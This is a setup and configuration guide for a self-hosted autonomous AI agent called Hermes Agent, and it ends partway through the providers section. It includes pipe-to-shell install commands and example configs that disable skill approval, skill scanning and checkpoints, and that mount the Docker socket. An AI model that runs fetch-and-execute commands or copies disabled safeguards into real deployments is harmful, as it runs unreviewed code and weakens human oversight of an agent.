
---

title: "Hermes Agent: The Complete Guide to Your Self-Improving AI Assistant"
description: "Complete setup guide for Hermes"
date: "07/05/2026"
draft: false
---

Hermes Agent represents a fundamental shift in how we interact with AI. It's not just a chatbot-it's a **persistent, self-improving, autonomous assistant** that lives on your infrastructure and operates across your digital life.

## **Table of Contents**

1. [Introduction](#introduction)
2. [What Makes Hermes Different](#what-makes-hermes-different)
3. [Installation & Setup](#installation--setup)
4. [Architecture Overview](#architecture-overview)
5. [Configuration Deep Dive](#configuration-deep-dive)
6. [AI Providers & Models](#ai-providers--models)
7. [Tools & Toolsets](#tools--toolsets)
8. [Skills System](#skills-system)
9. [Memory & Persistence](#memory--persistence)
10. [Messaging Gateway](#messaging-gateway)
11. [Advanced Features](#advanced-features)
12. [Security & Safety](#security--safety)
13. [Real-World Automation Workflows](#real-world-automation-workflows)
14. [Performance Optimization](#performance-optimization)
15. [Troubleshooting](#troubleshooting)
16. [Best Practices](#best-practices)
17. [Command Reference](#command-reference)
18. [Development & Contribution](#development--contribution)

---

## **Introduction**

### **The Evolution from Chat to Action**

Most AI assistants exist in a browser tab, waiting passively for your next question. They forget everything when you close the window. They can't act on your behalf. They don't learn from experience. They live on someone else's servers, subject to rate limits, privacy concerns, and service disruptions.

**Hermes Agent is fundamentally different.**

Hermes is an **autonomous, self-improving AI agent** that lives on **your infrastructure** and operates across **27+ messaging platforms** simultaneously. It's not just a chatbot-it's a persistent digital assistant that:

- **Remembers** who you are, your preferences, and your work patterns across sessions
- **Learns** from experience by creating reusable skills from complex tasks
- **Acts** autonomously through 70+ built-in tools and unlimited custom integrations
- **Improves** itself through automated skill curation and consolidation
- **Never sleeps**-running 24/7 on your server, VPS, or personal computer
- **Stays private**-your data never leaves your infrastructure unless you choose

### **Core Philosophy**

Hermes represents a paradigm shift from "AI that answers questions" to **"AI that operates systems."**

**Traditional AI:**

- "What should I do about this email?"
- "How do I deploy this code?"
- "What's my schedule today?"

**Hermes Agent:**

- Already sorted your emails, drafted responses, updated your calendar, and notified relevant stakeholders
- Ran tests, created a PR, triggered CI/CD pipelines, and posted deployment status to Slack
- Sent you a comprehensive morning brief at 7 AM with schedule, urgent emails, weather, and task priorities

### **Key Statistics (2026)**

- **73+ built-in tools** across 28+ toolsets
- **27+ messaging platforms** supported natively
- **18+ AI providers** with automatic failover
- **90+ bundled skills** ready to use out of the box
- **60+ optional skills** available from the Skills Hub
- **~25,000 automated tests** ensuring reliability
- **MIT License** - completely free and open-source

---

## **What Makes Hermes Different**

### **1. Persistent Memory System**

Unlike chat-based AI that loses context when you close the tab, Hermes maintains **multi-layered memory**:

**Short-term Memory (Sessions):**

- Complete conversation history stored in SQLite with FTS5 full-text search
- Cross-session search and retrieval
- Session lineage tracking (parent/child relationships across compressions)
- Per-platform session isolation

**Long-term Memory (MEMORY.md & USER.md):**

- Automatically curated facts about you, your preferences, and work style
- Survives across all sessions and platform connections
- Updated dynamically as Hermes learns about you
- Stored in `~/.hermes/memories/` as human-readable markdown

**Procedural Memory (Skills):**

- Agent-created skills from complex problem-solving
- Reusable workflows for recurring task types
- Progressive disclosure to minimize token usage
- Automatic curation, archival, and consolidation

**External Memory Providers:**

- **Honcho** - AI-native persistent memory with dialectic reasoning
- **OpenViking** - Open-source memory backend
- **Mem0** - Contextual memory with semantic search
- **Hindsight** - Past experience retrieval
- **Holographic** - Distributed memory systems
- **RetainDB** - Database-backed memory
- **ByteRover** - File-based memory
- **Supermemory** - Neural memory architectures

### **2. Autonomous Skill Creation**

After completing complex tasks (5+ tool calls), Hermes automatically creates **reusable skill documents**-programmatic memories that encode "how to do this thing."

**Example: Medical Billing Automation**

A real user (anesthesiologist) automated their daily billing workflow:

1. Reads procedure notes from EMR system
2. Extracts CPT codes using pattern matching
3. Generates insurance billing forms
4. Submits to multiple insurance portals
5. Tracks claim status and follow-ups

Hermes created a `medical-billing` skill that now executes this entire workflow automatically every evening, saving 2-3 hours daily.

**Skill Lifecycle:**

- **Creation:** Automatic after complex successful tasks
- **Usage Tracking:** The Curator monitors how often each skill is used
- **Staleness Detection:** Unused skills are flagged for archival
- **Consolidation:** Overlapping skills are merged automatically
- **Protection:** Pinned skills are never auto-deleted

### **3. Multi-Platform Messaging Gateway**

Hermes connects to **27+ messaging platforms** through a unified gateway architecture:

**Native Platforms (19):**

- Telegram (recommended for setup speed)
- Discord (text channels, DMs, voice channels)
- Slack
- WhatsApp (via Baileys bridge)
- Signal (via Signal CLI)
- SMS (via Twilio)
- Email (IMAP/SMTP)
- Matrix
- Mattermost
- Home Assistant
- DingTalk
- WeChat/Weixin
- Yuanbao (Tencent)
- LINE
- SimpleX Chat
- Google Chat
- QQBot
- BlueBubbles (iMessage)
- Webhook endpoints

**Plugin Platforms (2):**

- Microsoft Teams
- IRC

**Key Features:**

- **Unified Configuration:** Same gateway process handles all platforms
- **Per-Platform Toolsets:** Different capabilities per platform
- **Session Persistence:** Conversations survive gateway restarts
- **User Authorization:** Allowlists and DM pairing controls
- **Cross-Platform Mirroring:** Share context across platforms
- **Voice Support:** Real-time voice on Telegram, Discord, CLI

### **4. Self-Improvement Loop (The Curator)**

The **Curator** is an automated background maintenance system that keeps your agent sharp:

**What It Does:**

- **Tracks Skill Usage:** Monitors view, use, and patch frequency
- **Identifies Stale Skills:** Flags skills unused for configurable periods
- **Archives Outdated Entries:** Moves old skills to archive storage
- **Consolidates Overlapping Skills:** Merges similar skills using LLM analysis
- **Protects Pinned Skills:** Prevents deletion of critical skills
- **LLM-Driven Review:** Uses AI to analyze skill quality and relevance

**Configuration:**

```yaml
curator:
  enabled: true
  review_interval_days: 7
  staleness_threshold_days: 30
  archive_after_days: 90
```

### **5. Always-On Infrastructure**

Hermes runs on **your hardware**, giving you:

- **Complete Privacy:** Data never leaves your infrastructure
- **No Rate Limits:** Use AI as much as you want (subject to provider limits)
- **Offline Operation:** Local Ollama models work without internet
- **Custom Integrations:** Connect to internal tools and APIs
- **24/7 Availability:** Cron jobs and automated tasks run continuously
- **Full Control:** You own the entire stack

**Deployment Options:**

- **Bare Metal:** Direct installation on Linux/macOS/Windows
- **Docker:** Containerized deployment with volume persistence
- **WSL2:** Windows Subsystem for Linux
- **Termux:** Run directly on Android phones
- **NixOS:** Declarative configuration with Nix package manager
- **Cloud VPS:** Deploy to AWS, DigitalOcean, Hetzner, etc.

---

## **Installation & Setup**

### **System Requirements**

**Minimum:**

- **OS:** Linux (any modern distro), macOS 10.15+, Windows 10/11 (WSL2 recommended)
- **CPU:** x86_64 or ARM64 with AVX2 support (for local models)
- **RAM:** 8 GB (16 GB recommended for local models)
- **Storage:** 2 GB for Hermes + 5-40 GB per local model
- **Network:** Broadband internet (for cloud AI providers)

**Recommended:**

- **OS:** Linux (Ubuntu 22.04+, Debian 11+, Arch) or macOS
- **CPU:** 8+ cores
- **RAM:** 32 GB+ (for running 32B+ parameter models locally)
- **GPU:** NVIDIA with 8+ GB VRAM (for GPU-accelerated local inference)
- **Storage:** NVMe SSD with 50+ GB free space
- **Network:** Low-latency connection to AI providers

### **Quick Install (Mac/Linux/WSL2/Termux)**

**One-Line Installation:**

```bash
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash
```

**What This Does:**

1. Detects your OS and architecture
2. Installs dependencies (Python 3.10+, Git, curl)
3. Clones the Hermes Agent repository
4. Creates Python virtual environment
5. Installs dependencies via pip
6. Adds `hermes` command to your PATH
7. Creates `~/.hermes/` configuration directory

**Post-Installation:**

```bash
# Reload your shell configuration
source ~/.bashrc    # for bash
source ~/.zshrc     # for zsh
source ~/.fishrc    # for fish

# Verify installation
hermes --version

# Should output something like: Hermes Agent v2026.16.5
```

### **Install via pip (Python Package)**

Hermes v0.14.0+ is available on PyPI:

```bash
# Install globally
pip install hermes-agent

# Or install in user space
pip install --user hermes-agent

# Or use pipx for isolation
pipx install hermes-agent

# Verify
hermes --version
```

### **Windows Native Installation**

**Option 1: WSL2 (Recommended)**

```bash
# In PowerShell (as Administrator)
wsl --install

# After reboot, open WSL terminal and run:
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash
```

**Option 2: Native Windows (Early Beta)**

```powershell
# Run PowerShell as Administrator
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Install Git if not present
winget install git.git

# Install the Hermes installer
iwr -useb https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.ps1 | iex

# Add to PATH
$env:Path += ";$env:USERPROFILE\hermes-agent"
```

**Note:** Native Windows support is in beta. WSL2 provides better performance and compatibility.

### **Termux (Android)**

Run Hermes directly on your Android phone:

```bash
# Install Termux from F-Droid (not Google Play)

# Update packages
pkg update && pkg upgrade

# Install dependencies
pkg install python git curl wget

# Install Hermes
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash

# Source shell config
source ~/.bashrc

# Verify
hermes --version
```

**Android-Specific Features:**

- Full CLI and TUI support
- Gateway runs in background (use `termux-wake-lock`)
- Can control phone via Termux:API (SMS, notifications, etc.)
- Storage: Use `/sdcard/` for shared files

### **Docker Installation**

**Pull the Official Image:**

```bash
docker pull nousresearch/hermes-agent:latest
```

**Run with Persistent Storage:**

```bash
docker run -d \
  --name hermes-agent \
  -v hermes-data:/opt/hermes/.hermes \
  -e OPENROUTER_API_KEY=sk-or-xxx \
  --restart unless-stopped \
  nousresearch/hermes-agent:latest
```

**Interactive Shell:**

```bash
docker exec -it hermes-agent hermes chat
```

**Docker Compose:**

```yaml
version: '3.8'

services:
  hermes:
    image: nousresearch/hermes-agent:latest
    container_name: hermes-agent
    volumes:
      - hermes-data:/opt/hermes/.hermes
      - /var/run/docker.sock:/var/run/docker.sock  # For Docker backend
    environment:
      - OPENROUTER_API_KEY=${OPENROUTER_API_KEY}
      - TZ=${TZ:-UTC}
    restart: unless-stopped
    ports:
      - "9119:9119"  # Web dashboard

volumes:
  hermes-data:
```

### **Nix Installation**

**Quick Run (No Installation):**

```bash
nix run github:NousResearch/hermes-agent -- chat
```

**Install to Profile:**

```bash
nix profile install github:NousResearch/hermes-agent
hermes --version
```

**NixOS Module (Declarative):**

```nix
# configuration.nix
{
  services.hermes-agent = {
    enable = true;
    package = inputs.hermes-agent.packages.${system}.default;
    settings = {
      model.provider = "openrouter";
      model.default = "openrouter/free";
    };
    environmentFile = "/var/lib/hermes/.env";
    extraOptions = [ "--gateway" ];
  };
}
```

### **Initial Setup Wizard**

After installation, run the interactive setup:

```bash
hermes setup
```

**The Setup Wizard Will:**

1. **Choose AI Provider** (18+ options):
   - OpenRouter (recommended for beginners)
   - OpenAI (GPT-4, GPT-5, o1)
   - Anthropic (Claude 3.7, 3.5)
   - DeepSeek (DeepSeek-R1, V3)
   - Google (Gemini 2.0)
   - xAI (Grok-2, Grok-3)
   - Qwen (Qwen 2.5, 3.6)
   - MiniMax, Kimi, GLM, Hugging Face, and more

2. **Enter API Credentials**:
   - Keys stored securely in `~/.hermes/.env`
   - Never committed to version control
   - Supports OAuth flows for some providers

3. **Select Default Model**:
   - Browse available models for your provider
   - Set context window size
   - Configure temperature and other parameters

4. **Configure Personality**:
   - Choose from built-in personalities
   - Or customize `SOUL.md` with your own instructions

5. **Set Up Messaging Platforms**:
   - Connect Telegram, Discord, Slack, etc.
   - Configure per-platform toolsets
   - Set user authorization rules

6. **Verify Configuration**:
   - Test AI provider connectivity
   - Run diagnostic checks
   - Display configuration summary

### **Manual Configuration**

**Set Provider and Model:**

```bash
hermes config set model.provider openrouter
hermes config set model.default openrouter/free
```

**Set API Key:**

```bash
hermes config set OPENROUTER_API_KEY sk-or-xxx
# This automatically saves to ~/.hermes/.env
```

**Verify Configuration:**

```bash
hermes doctor
# Checks:
# - Configuration validity
# - API key presence
# - Provider connectivity
# - Tool availability
# - Gateway status
```

### **Configuration Files Overview**

All Hermes configuration lives in `~/.hermes/`:

| File/Directory | Purpose | Edit Method |
|----------------|---------|-------------|
| `config.yaml` | Main configuration | `hermes config edit` |
| `.env` | API keys and secrets | `hermes config set KEY VAL` |
| `auth.json` | OAuth credentials | Automatic (OAuth flow) |
| `SOUL.md` | Agent personality | Manual edit |
| `memories/` | Persistent memory | Auto-managed |
| `skills/` | Agent-created skills | `hermes skills` commands |
| `sessions/` | Gateway sessions | Auto-managed |
| `cron/` | Scheduled jobs | `hermes cron` commands |
| `logs/` | System logs | Auto-managed (redacted) |

**Example config.yaml:**

```yaml
# Model configuration
model:
  provider: openrouter
  default: openrouter/free
  context_length: 128000
  temperature: 0.7

# Terminal backend
terminal:
  backend: docker  # local, docker, ssh, modal, daytona, singularity
  workdir: /workspace

# Toolsets
toolsets:
  - hermes-cli

# Compression
compression:
  enabled: true
  threshold: 0.50
  target_ratio: 0.20

# Memory
memory:
  provider: default  # or honcho, mem0, etc.
  
# Gateway
gateway:
  enabled: true
  port: 9119
  platforms:
    - telegram
    - discord

# Skills
skills:
  write_approval: false
  guard_agent_created: false

# Checkpoints
checkpoints:
  enabled: false
  max_snapshots: 20
```

---

## **Architecture Overview**

### **System Architecture Diagram**

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Entry Points                                  │
│                                                                      │
│  CLI (cli.py)    Gateway (gateway/run.py)    ACP (acp_adapter/)     │
│  Batch Runner    API Server                  Python Library          │
└──────────┬──────────────┬───────────────────────┬───────────────────┘
           │              │                       │
           ▼              ▼                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     AIAgent (run_agent.py)                          │
│                                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐               │
│  │ Prompt       │  │ Provider     │  │ Tool         │               │
│  │ Builder      │  │ Resolution   │  │ Dispatch     │               │
│  │ (prompt_     │  │ (runtime_    │  │ (model_      │               │
│  │  builder.py) │  │  provider.py)│  │  tools.py)   │               │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘               │
│         │                 │                 │                       │
│  ┌──────┴───────┐  ┌──────┴───────┐  ┌──────┴───────┐               │
│  │ Compression  │  │ 3 API Modes  │  │ Tool Registry│               │
│  │ & Caching    │  │ chat_compl.  │  │ (registry.py)│               │
│  │              │  │ codex_resp.  │  │ 73+ tools    │               │
│  │              │  │ anthropic    │  │ 28 toolsets  │               │
│  └──────────────┘  └──────────────┘  └──────────────┘               │
└─────────┴─────────────────┴─────────────────┴───────────────────────┘
           │                                    │
           ▼                                    ▼
┌───────────────────┐              ┌──────────────────────┐
│ Session Storage   │              │ Tool Backends         │
│ (SQLite + FTS5)   │              │ Terminal (6 backends) │
│ hermes_state.py   │              │ Browser (5 backends)  │
│ gateway/session.py│              │ Web (4 backends)      │
└───────────────────┘              │ MCP (dynamic)         │
                                   │ File, Vision, etc.    │
                                   └──────────────────────┘
```

### **Directory Structure**

```
hermes-agent/
├── run_agent.py              # AIAgent - core conversation loop
├── cli.py                    # HermesCLI - interactive terminal UI
├── model_tools.py            # Tool discovery, schema collection, dispatch
├── toolsets.py               # Tool groupings and platform presets
├── hermes_state.py           # SQLite session/state database with FTS5
├── hermes_constants.py       # HERMES_HOME, profile-aware paths
├── batch_runner.py           # Batch trajectory generation
│
├── agent/                    # Agent internals
│   ├── prompt_builder.py     # System prompt assembly
│   ├── context_engine.py     # ContextEngine ABC (pluggable)
│   ├── context_compressor.py # Default engine - lossy summarization
│   ├── prompt_caching.py     # Anthropic prompt caching
│   ├── auxiliary_client.py   # Auxiliary LLM for side tasks
│   ├── model_metadata.py     # Model context lengths, token estimation
│   ├── models_dev.py         # models.dev registry integration
│   ├── anthropic_adapter.py  # Anthropic Messages API adapter
│   ├── display.py            # KawaiiSpinner, tool preview formatting
│   ├── skill_commands.py     # Skill slash commands
│   ├── memory_manager.py     # Memory manager orchestration
│   ├── memory_provider.py    # Memory provider ABC
│   └── trajectory.py         # Trajectory saving helpers
│
├── hermes_cli/               # CLI subcommands and setup
│   ├── main.py               # Entry point - all `hermes` subcommands
│   ├── config.py             # DEFAULT_CONFIG, OPTIONAL_ENV_VARS
│   ├── commands.py           # COMMAND_REGISTRY - slash commands
│   ├── auth.py               # PROVIDER_REGISTRY, credentials
│   ├── runtime_provider.py   # Provider → api_mode + credentials
│   ├── models.py             # Model catalog, provider model lists
│   ├── model_switch.py       # /model command logic
│   ├── setup.py              # Interactive setup wizard
│   ├── skin_engine.py        # CLI theming engine
│   ├── skills_config.py      # hermes skills - enable/disable
│   ├── skills_hub.py         # /skills slash command
│   ├── tools_config.py       # hermes tools - enable/disable
│   ├── plugins.py            # PluginManager - discovery, loading
│   ├── callbacks.py          # Terminal callbacks (clarify, sudo)
│   └── gateway.py            # hermes gateway start/stop
│
├── tools/                    # Tool implementations
│   ├── registry.py           # Central tool registry
│   ├── approval.py           # Dangerous command detection
│   ├── terminal_tool.py      # Terminal orchestration
│   ├── process_registry.py   # Background process management
│   ├── file_tools.py         # read_file, write_file, patch, search
│   ├── web_tools.py          # web_search, web_extract
│   ├── browser_tool.py       # 10 browser automation tools
│   ├── code_execution_tool.py # execute_code sandbox
│   ├── delegate_tool.py      # Subagent delegation
│   ├── mcp_tool.py           # MCP client
│   ├── credential_files.py   # File-based credential passthrough
│   ├── env_passthrough.py    # Env var passthrough for sandboxes
│   ├── ansi_strip.py         # ANSI escape stripping
│   └── environments/         # Terminal backends
│       ├── local.py
│       ├── docker.py
│       ├── ssh.py
│       ├── modal.py
│       ├── daytona.py
│       └── singularity.py
│
├── gateway/                  # Messaging platform gateway
│   ├── run.py                # GatewayRunner - message dispatch
│   ├── session.py            # SessionStore - conversation persistence
│   ├── delivery.py           # Outbound message delivery
│   ├── pairing.py            # DM pairing authorization
│   ├── hooks.py              # Hook discovery and lifecycle events
│   ├── mirror.py             # Cross-session message mirroring
│   ├── status.py             # Token locks, profile tracking
│   ├── builtin_hooks/        # Extension point for hooks
│   └── platforms/            # 20 platform adapters
│       ├── telegram.py
│       ├── discord.py
│       ├── slack.py
│       ├── whatsapp.py
│       ├── signal.py
│       ├── matrix.py
│       ├── mattermost.py
│       ├── email.py
│       ├── sms.py
│       ├── dingtalk.py
│       ├── feishu.py
│       ├── wecom.py
│       ├── wecom_callback.py
│       ├── weixin.py
│       ├── bluebubbles.py
│       ├── qqbot.py
│       ├── homeassistant.py
│       ├── webhook.py
│       ├── api_server.py
│       └── yuanbao.py
│
├── acp_adapter/              # ACP server (VS Code / Zed / JetBrains)
├── cron/                     # Scheduler (jobs.py, scheduler.py)
├── plugins/                  # Plugin system
│   ├── memory/               # Memory provider plugins
│   │   ├── honcho/
│   │   ├── mem0/
│   │   ├── openviking/
│   │   └── ...
│   └── context_engine/       # Context engine plugins
├── skills/                   # Bundled skills (~90)
├── optional-skills/          # Official optional skills (~60)
├── website/                  # Docusaurus documentation site
└── tests/                    # Pytest suite (~25,000 tests)
```

### **Data Flow**

**CLI Session Flow:**

```
User input → HermesCLI.process_input()
  → AIAgent.run_conversation()
    → prompt_builder.build_system_prompt()
      → Load SOUL.md, context files, memory
      → Inject skills index
      → Apply compression if needed
    → runtime_provider.resolve_runtime_provider()
      → Map (provider, model) to (api_mode, api_key, base_url)
    → API call
      → chat_completions (OpenAI-compatible)
      → codex_responses (OpenAI Codex)
      → anthropic_messages (Anthropic)
    → tool_calls? → model_tools.handle_function_call()
      → Dispatch to appropriate tool
      → Execute in backend (local/docker/ssh/etc.)
      → Return result to agent
      → Loop until completion
    → final response → display → save to SessionDB
```

**Gateway Message Flow:**

```
Platform event → Adapter.on_message() → MessageEvent
  → GatewayRunner._handle_message()
    → authorize user (allowlist, DM pairing)
    → resolve session key (per-platform, per-user)
    → create AIAgent with session history
    → AIAgent.run_conversation()
    → deliver response back through adapter
    → save to SessionDB
```

**Cron Job Flow:**

```
Scheduler tick → load due jobs from jobs.json
  → create fresh AIAgent (no history)
  → inject attached skills as context
  → run job prompt
  → deliver response to target platform
  → update job state and next_run
```

### **Design Principles**

| Principle | What It Means |
|-----------|---------------|
| **Prompt Stability** | System prompt doesn't change mid-conversation. No cache-breaking mutations except explicit user actions (`/model`). |
| **Observable Execution** | Every tool call is visible to the user via callbacks. Progress updates in CLI (spinner) and gateway (chat messages). |
| **Interruptible** | API calls and tool execution can be cancelled mid-flight by user input or signals. |
| **Platform-Agnostic Core** | One AIAgent class serves CLI, gateway, ACP, batch, and API server. Platform differences live in the entry point. |
| **Loose Coupling** | Optional subsystems (MCP, plugins, memory providers) use registry patterns and check_fn gating, not hard dependencies. |
| **Profile Isolation** | Each profile (`hermes -p <name>`) gets its own HERMES_HOME, config, memory, sessions, and gateway PID. |

---

## **Configuration Deep Dive**

### **Configuration File Locations**

| File | Purpose | Management |
|------|---------|------------|
| `~/.hermes/config.yaml` | Main configuration | `hermes config edit` |
| `~/.hermes/.env` | API keys and secrets | `hermes config set KEY VAL` |
| `~/.hermes/auth.json` | OAuth credentials | Automatic (OAuth flow) |
| `~/.hermes/SOUL.md` | Agent personality | Manual edit |
| `~/.hermes/memories/MEMORY.md` | Long-term memory | Auto-managed |
| `~/.hermes/memories/USER.md` | User context | Auto-managed |

### **Complete Configuration Reference**

```yaml
# ============================================
# MODEL CONFIGURATION
# ============================================
model:
  # Primary provider (openrouter, openai, anthropic, etc.)
  provider: openrouter
  
  # Default model to use
  default: openrouter/free
  
  # Context window size (tokens)
  context_length: 128000
  
  # Temperature for generation
  temperature: 0.7
  
  # Top-p sampling
  top_p: 0.9
  
  # Fallback models (tried in order if primary fails)
  fallbacks:
    - google/gemini-2.0-flash-exp:free
    - deepseek/deepseek-r1:free

# ============================================
# AUXILIARY MODELS (for side tasks)
# ============================================
auxiliary:
  # Compression model (summarizing long conversations)
  compression:
    model: ""  # Empty = use main model
    provider: "auto"  # auto, openrouter, nous, etc.
    base_url: null  # Custom endpoint
  
  # Vision model (analyzing images)
  vision:
    model: ""  # Empty = use main model if vision-capable
    provider: "auto"
  
  # TTS model (text-to-speech)
  tts:
    model: ""
    provider: "auto"

# ============================================
# TERMINAL BACKEND
# ============================================
terminal:
  # Backend for command execution
  # Options: local, docker, ssh, modal, daytona, singularity
  backend: local
  
  # Working directory
  workdir: /workspace
  
  # Environment variables to pass to terminal
  env:
    - PATH
    - HOME
  
  # Allowed paths (for security)
  allowed_paths:
    - /home/username/projects
    - /mnt/data
  
  # Require approval for dangerous commands
  require_approval: true

# ============================================
# TOOLSETS
# ============================================
toolsets:
  - hermes-cli  # Default for CLI
  
  # Platform-specific overrides
  # platform_toolsets:
  #   hermes-telegram:
  #     - hermes-cli
  #   hermes-discord:
  #     - hermes-cli
  #     - discord
  #     - discord_admin

# Disable toolsets globally
agent:
  disabled_toolsets:
    - memory  # Disable memory tools everywhere
    - web     # Disable web tools everywhere

# ============================================
# COMPRESSION
# ============================================
compression:
  # Enable automatic compression
  enabled: true
  
  # Compress when conversation reaches this % of context limit
  threshold: 0.50  # 50%
  
  # Target ratio: fraction of threshold to preserve
  target_ratio: 0.20  # Keep 20% of threshold as recent tail
  
  # Minimum recent messages to keep uncompressed
  protect_last_n: 20
  
  # Non-system head messages to pin across compactions
  protect_first_n: 3
  
  # Gateway safety valve: hard message limit
  hygiene_hard_message_limit: 5000

# ============================================
# MEMORY
# ============================================
memory:
  # Memory provider (default, honcho, mem0, etc.)
  provider: default
  
  # Require approval for memory writes
  write_approval: false
  
  # Provider-specific config
  config:
    # Example for Honcho
    # api_key: ${HONCHO_API_KEY}
    # app_id: ${HONCHO_APP_ID}

# ============================================
# SKILLS
# ============================================
skills:
  # Require approval for all skill writes
  write_approval: false
  
  # Scan agent-created skills for dangerous patterns
  guard_agent_created: false
  
  # Skill-specific configuration
  config:
    myplugin:
      path: ~/myplugin-data
      api_endpoint: https://api.example.com

# ============================================
# CHECKPOINTS
# ============================================
checkpoints:
  # Enable automatic checkpoints before destructive ops
  enabled: false
  
  # Maximum snapshots to keep per directory
  max_snapshots: 20

# ============================================
# GATEWAY
# ============================================
gateway:
  # Enable gateway
  enabled: true
  
  # Port for web dashboard
  port: 9119
  
  # Enable OAuth for dashboard
  oauth_client_id: ""  # Set to enable OAuth
  
  # Platforms to connect
  platforms:
    - telegram
    - discord
    - slack
  
  # User authorization
  allowlist:
    - telegram:123456789  # Platform:user_id
    - discord:987654321
  
  # DM pairing (require pairing for first DM)
  dm_pairing: true

# ============================================
# CRON
# ============================================
cron:
  # Enable cron scheduler
  enabled: true
  
  # Timezone for schedules
  timezone: UTC
  
  # Default toolsets for cron jobs
  toolsets:
    - hermes-cli

# ============================================
# PLUGINS
# ============================================
plugins:
  # Enable/disable specific plugins
  enabled:
    - spotify
    - homeassistant
  
  # Plugin-specific config
  spotify:
    client_id: ${SPOTIFY_CLIENT_ID}
    client_secret: ${SPOTIFY_CLIENT_SECRET}

# ============================================
# MCP SERVERS
# ============================================
mcp_servers:
  github:
    command: npx
    args: ["-y", "@modelcontextprotocol/server-github"]
    env:
      GITHUB_TOKEN: ${GITHUB_TOKEN}
  
  filesystem:
    command: npx
    args: ["-y", "@modelcontextprotocol/server-filesystem"]
    config:
      allowed_paths:
        - /home/username/documents

# ============================================
# LOGGING
# ============================================
logging:
  # Log level (debug, info, warning, error)
  level: info
  
  # Log file location
  file: ~/.hermes/logs/hermes.log
  
  # Maximum log file size (MB)
  max_size: 10
  
  # Number of backup logs to keep
  backup_count: 5

# ============================================
# API SERVER
# ============================================
api_server:
  # Enable OpenAI-compatible API server
  enabled: false
  
  # Port to listen on
  port: 8080
  
  # API key for authentication
  api_key: ${HERMES_API_KEY}
  
  # CORS allowed origins
  cors_origins:
    - http://localhost:3000
```

### **Environment Variables**

Hermes uses environment variables for sensitive data. Set these in `~/.hermes/.env`:

**AI Providers:**

```bash
# OpenRouter
OPENROUTER_API_KEY=sk-or-xxx

# OpenAI
OPENAI_API_KEY=sk-xxx

# Anthropic
ANTHROPIC_API_KEY=sk-ant-xxx

# Google/Gemini
GOOGLE_API_KEY=xxx

# xAI/Grok
XAI_API_KEY=xxx

# DeepSeek
DEEPSEEK_API_KEY=xxx

# Hugging Face
HUGGINGFACE_API_KEY=hf_xxx

# Nous Portal
NOUS_API_KEY=xxx
```

**Platform Credentials:**

```bash
# Telegram
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz

# Discord
DISCORD_BOT_TOKEN=xxx

# Slack
SLACK_BOT_TOKEN=xoxb-xxx

# WhatsApp
WHATSAPP_PHONE_NUMBER=+1234567890

# Signal
SIGNAL_PHONE_NUMBER=+1234567890

# Twilio (SMS)
TWILIO_ACCOUNT_SID=xxx
TWILIO_AUTH_TOKEN=xxx
TWILIO_PHONE_NUMBER=+1234567890

# Email
EMAIL_IMAP_SERVER=imap.gmail.com
EMAIL_SMTP_SERVER=smtp.gmail.com
EMAIL_USERNAME=user@gmail.com
EMAIL_PASSWORD=xxx

# Home Assistant
HASS_TOKEN=xxx
HASS_URL=http://localhost:8123

# Spotify
SPOTIFY_CLIENT_ID=xxx
SPOTIFY_CLIENT_SECRET=xxx
SPOTIFY_REDIRECT_URI=http://localhost:8888/callback
```

**Other Services:**

```bash
# Web Search
EXA_API_KEY=xxx
PARALLEL_API_KEY=xxx
FIRECRAWL_API_KEY=xxx
TAVILY_API_KEY=xxx

# Image Generation
FAL_KEY=xxx
KREA_API_KEY=xxx

# Video Generation
XAI_API_KEY=xxx  # Also used for Grok

# Memory Providers
HONCHO_API_KEY=xxx
HONCHO_APP_ID=xxx

# MCP Servers
GITHUB_TOKEN=xxx
```

### **Configuration Management Commands**

```bash
# View current configuration
hermes config

# Edit configuration in editor
hermes config edit

# Set a specific value
hermes config set KEY VALUE

# Examples:
hermes config set model.provider openrouter
hermes config set model.default openrouter/free
hermes config set terminal.backend docker
hermes config set OPENROUTER_API_KEY sk-or-xxx

# Check for missing configuration options
hermes config check

# Migrate configuration to latest schema
hermes config migrate

# Show configuration with skill settings
hermes config show
```

### **Global Toolset Disable**

To disable specific toolsets across all platforms:

```yaml
agent:
  disabled_toolsets:
    - memory       # Hide memory tools everywhere
    - web          # No web search/extract anywhere
    - browser      # No browser automation anywhere
```

This applies **after** per-platform tool config, so a toolset listed here is always removed-even if a platform's saved config still lists it.

### **Skill Configuration**

Skills can declare their own configuration settings via their SKILL.md frontmatter:

```yaml
skills:
  config:
    medical-billing:
      emr_endpoint: https://emr.hospital.com/api
      insurance_portals:
        - name: BlueCross
          url: https://bcbs.com/claims
        - name: Aetna
          url: https://aetna.com/claims
      default_cpt_codes:
        - "99213"
        - "99214"
```

**Setting skill config:**

```bash
hermes config set skills.config.medical-billing.emr_endpoint https://emr.hospital.com/api
```

### **Compression Configuration**

Hermes automatically compresses long conversations. Configure compression:

```yaml
compression:
  enabled: true              # Toggle on/off
  threshold: 0.50            # Compress at 50% of context limit
  target_ratio: 0.20         # Preserve 20% of threshold as recent tail
  protect_last_n: 20         # Keep last 20 messages uncompressed
  protect_first_n: 3         # Pin first 3 non-system messages
  hygiene_hard_message_limit: 5000  # Safety valve: force compress at 5000 msgs

# Compression model (optional - defaults to main model)
auxiliary:
  compression:
    model: "google/gemini-2.5-flash"  # Cheaper/faster model for compression
    provider: "openrouter"
    base_url: null  # Custom endpoint
```

**Important:** The compression model must have a context window **at least as large** as your main model, or summarization will fail and context will be lost.

### **Checkpoint Configuration**

Automatic filesystem snapshots before destructive operations:

```yaml
checkpoints:
  enabled: false           # Opt-in (default: false)
  max_snapshots: 20        # Max to keep per directory
```

**Manual checkpointing:**

```bash
hermes checkpoint create "before-reorganizing-docs"
# ... do operations ...
hermes checkpoint rollback "before-reorganizing-docs"  # If something went wrong
hermes checkpoint list
hermes checkpoint delete "before-reorganizing-docs"
```

---

## **AI Providers & Models**

### **Supported Providers (18+)**

Hermes supports 18+ AI providers with automatic failover and credential pooling:

